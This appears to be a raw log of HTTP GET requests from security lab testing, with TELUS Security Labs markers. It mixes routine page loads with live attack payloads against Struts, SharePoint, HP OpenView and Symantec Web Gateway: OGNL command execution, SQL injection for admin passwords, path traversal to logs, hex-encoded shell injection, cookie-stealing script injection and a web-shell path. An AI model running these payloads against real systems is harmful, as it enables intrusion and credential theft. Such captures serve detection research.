GET /WebResource.axd?d=agIhCKk2RWAal05H4DD16A2&t=634613669651093750
GET /WebResource.axd?d=iiF8l_N4X-ECS3JrwOi-JV4zUWdfloWZ4kqLcQI0dqE1&t=634613669651093750
GET /default.aspx
GET /register.aspx
GET /WebResource.axd?d=209WOHd1LICyeiCTXJZIDA2&t=634608364087187500
GET /WebResource.axd?d=F80H6GJ0DxMO9ttr8PBwf9tYw75wElWDGEOuXPj8-Z41&t=634608364087187500
GET /favicon.ico
GET /favicon.ico
GET /default.aspx
GET /OvCgi/OpenView5.exe?Target=Main&Scope=Snmp&Action=../../../log/setup.log
GET /OvCgi/webappmon.exe?act=natping&ins=nowait&app=natping&cache=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
GET /favicon.ico
GET /favicon.ico
GET /Default.aspx?param=A\\,'zzz;background-color:';w:expression(alert(document.cookie));'
GET /favicon.ico
GET /example.php
GET /CVE_2012_0392/Test.action
GET /httponly.php
GET /kill.html
GET /phpkill.js
GET /favicon.ico
GET /favicon.ico
GET /SitePages/Home.aspx
GET /_layouts/inplview.aspx?Cmd=Ctx&List=%7BDF165B99-6F48-437B-B48B-C68A7AE623BC%7d&View=%7B370D3EF2-FD9D-40DB-9BFC-268A6C78DF5F%7d&ViewCount=28&IsXslView=TRUE&Field=LinkFilename&ID=1&ListViewPageUrl=javascript:alert(%22TSL%22);//
GET /favicon.ico
GET /CVE_2011_3923/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean(false),%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean(true),%20@java.lang.Runtime@getRuntime().exec(%27mkdir%20/tmp/PWND%27))(meh)&z[(foo)(%27meh%27)]=true
GET /favicon.ico
GET /tpmx/getAttachment?hwKey=1&revesion=1&fileType=ATTACHMENT&fileName=file'%20union%20select%20password%20from%20%24%23SCHEMA.users%20where%20userid='admin
GET /test.mp4/pGtsleJI.swf
GET /test.mp4
GET /Lists/Tasks/AllItems.aspx/%22);%7D%7Balert(document.cookie+%22
GET /Lists/Tasks/AllItems.aspx/%22);%7D%7Balert(document.cookie+%22
GET /Lists/Tasks/AllItems.aspx/%22);%7D%7Balert(document.cookie+%22
GET /_layouts/1033/ie55up.js?rev=Ni7%2Fj2ZV%2FzCvd09XYSSWvA%3D%3D
GET /_layouts/1033/ie55up.js?rev=Ni7%2Fj2ZV%2FzCvd09XYSSWvA%3D%3D
GET /_layouts/1033/ie55up.js?rev=Ni7%2Fj2ZV%2FzCvd09XYSSWvA%3D%3D
GET /_layouts/images/gosearch.gif
GET /_layouts/images/issues.png
GET /_layouts/images/attachhd.gif
GET /_layouts/images/imnhdr.gif
GET /amxml
GET /4Zh0mzeP
GET /4Zh0mzeP/
GET /favicon.ico
GET /4Zh0mzeP/Applet.jar
GET /4Zh0mzeP/Applet.jar
GET /4Zh0mzeP/
GET /webreports?page=CreateScheduledActivity&ScheduleParam=97859%27%3balert(1)//68cb70c025e
GET /upl/suntzu.asp
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /nps/servlet/webacc
GET /nps/servlet/webacc?taskId=fw.Header&merge=fw.iManagerHeader
GET /nps/servlet/webacc?taskId=dev.Empty&merge=fw.Body&view=Tasks
GET /nps/servlet/webacc?NPService=fw.LaunchService&NPAction=CompleteReturn&returnID=fw.HomePage&firstTime=true
GET /nps/servlet/webacc?taskId=dev.Empty&merge=fw.Empty&firstTime=true
GET /nps/servlet/webacc?taskId=fw.Nav&merge=fw.Nav&view=Tasks
GET /nps/servlet/webacc?taskId=fw.Launch&merge=fw.Launch&tasksMode=&category=&view=Tasks
GET /nps/servlet/webacc?taskId=dev.Empty&merge=fw.LaunchEmptyMenu
GET /nps/servlet/webacc?taskId=fw.HomePage&merge=fw.HomePage&User.context=
GET /nps/servlet/frameservice?NPService=fw.LaunchService&NPAction=Delegate&delegate=base.CreateAttribute&launcher=fw.HomePage&lifecycle=Recreate&repeatable=true
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /spywall/timer.php?d=4099&amp;l=22665%27&lt;img%20src=%22myimage.jpg%22&gt;&amp;profile=40
GET /spywall/styles/mi5.css
GET /spywall/images/mi5.gif
GET /favicon.ico
GET /<?php
GET /spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /students?id[students[pass]]=57127
GET /assets/application.css?body=1
GET /assets/jquery_ujs.js?body=1
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /_vti_bin/owssvr.dll?CS=65001&Using=_layouts/query.iqy&List=%7B9D096225%2DB71C%2D4B99%2DAA68%2DEC1C41B2266A%7D<script>alert(document.cookies)</script>&View=%7BC89E1A4C%2D6FCE%2D47DB%2D8466%2DA5196B1E9306%7D&RootFolder=%2FLists%2fList2&CacheControl=1
GET /_vti_bin/owssvr.dll?CS=65001&Using=_layouts/query.iqy&List=%7B9D096225%2DB71C%2D4B99%2DAA68%2DEC1C41B2266A%7D<script>alert(document.cookies)</script>&View=%7BC89E1A4C%2D6FCE%2D47DB%2D8466%2DA5196B1E9306%7D&RootFolder=%2FLists%2fList2&CacheControl=1
GET /_vti_bin/owssvr.dll?CS=65001&Using=_layouts/query.iqy&List=%7B9D096225%2DB71C%2D4B99%2DAA68%2DEC1C41B2266A%7D<script>alert(document.cookies)</script>&View=%7BC89E1A4C%2D6FCE%2D47DB%2D8466%2DA5196B1E9306%7D&RootFolder=%2FLists%2fList2&CacheControl=1
GET /default.aspx
GET /_layouts/userdisp.aspx?Force=True&ID=6&Source=http%3A%2F%2F172%2E16%2E8%2E79%2Fdefault%2Easpx
GET /_layouts/useredit.aspx?ID=6&Source=http%3A%2F%2F172%2E16%2E8%2E79%2Fdefault%2Easpx&IsDlg=1
GET /_layouts/userdisp.aspx?Force=True&ID=6&Source=http%3A%2F%2F172%2E16%2E8%2E79%2Fdefault%2Easpx
GET /default.aspx
GET /Lists/Team%20Discussion/AllItems.aspx
GET /Lists/Team%20Discussion/AllItems.aspx?RootFolder=%2FLists%2FTeam%20Discussion%2FTest%20Discussion&FolderCTID=0x012002006F2300843C8D804A833718773E3D7491&View=
GET /Lists/Team%20Discussion/Flat.aspx?RootFolder=%2FLists%2FTeam%20Discussion%2FTest%20Discussion&FolderCTID=0x012002006F2300843C8D804A833718773E3D7491
GET /favicon.ico
GET /Hewlett-Packard/OpenView/Coda/
GET /Hewlett-Packard/OpenView/Coda/
GET /spywall/blocked.php?d=3&file=3&id=1)%20or%20''%20=%20(select%20'hello'%20into%20outfile%20'telussecuritylabs.txt'
GET /poc.html
GET /favicon.ico
GET /epaq
GET /spywall/pbcontrol.php?filename=TELUS%22;%65%63%68%6F%20%27%54%45%4C%55%53%20%53%45%43%55%52%49%54%59%20%4C%41%42%53%27%20%3e%20%2f%74%6d%70%2f%70%6F%63%2E%74%78%74;%22&stage=0
GET /favicon.ico
GET /SiteScope/servlet/Main
GET /favicon.ico
GET /favicon.ico
GET /favicon.ico
GET /SMSReporting_TSL/Reportchart.asp?ReportID=0000000137&--%3E%3cscript%3ealert(%27test%27);%3C/script%3E%3c!--=aaaaa
GET /SMSReporting_TSL/Reportchart.asp?ReportID=0000000137&--%3E%3cscript%3ealert(%27test%27);%3C/script%3E%3c!--=aaaaa
GET /SMSReporting_TSL/Reportchart.asp?ReportID=0000000137&--%3E%3cscript%3ealert(%27test%27);%3C/script%3E%3c!--=aaaaa
GET /SMSReporting_TSL/00000409/styles.css
GET /SMSReporting_TSL/ChartGif.asp?ReportID=0000000137&--%3E%3cscript%3ealert(%27test%27);%3C/script%3E%3c!--=aaaaa&cbxChartType=0
GET /SMSReporting_TSL/ChartGif.asp?ReportID=0000000137&--%3E%3cscript%3ealert(%27test%27);%3C/script%3E%3c!--=aaaaa&cbxChartType=0
